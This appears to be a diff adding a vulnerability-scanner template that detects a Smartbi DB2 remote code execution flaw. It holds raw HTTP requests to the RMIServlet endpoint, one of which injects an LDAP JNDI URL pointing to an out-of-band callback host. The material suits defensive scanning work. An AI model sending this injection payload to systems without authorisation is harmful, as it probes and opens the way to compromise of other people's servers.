@@ -1,0 +1,49 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - stackTrace
+        - negative: true
+          part: body
+          type: word
+          words:
+            - CLIENT_USER_NOT_LOGIN
+            - 会存在RCE的安全漏洞
+      matchers-condition: and
+      raw:
+        - |
+          POST /smartbi/vision/RMIServlet HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      raw:
+        - |
+          POST /smartbi/vision/RMIServlet HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{interactsh-url}}","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+id: smartbi-db2-biconfigservice-rce-1
+info:
+    author: xpoc
+    description: |
+        Smartbi versions prior to v10.5.8 (20221125) have a DB2 command execution vulnerability.
+    name: Smartbi DB2 - Remote Code Execution
+    reference:
+        - https://www.smartbi.com.cn/patchinfo
+    severity: critical
+    tags:
+        - SMARTBI
+        - Eserv
+        - Servlet
+        - eserv
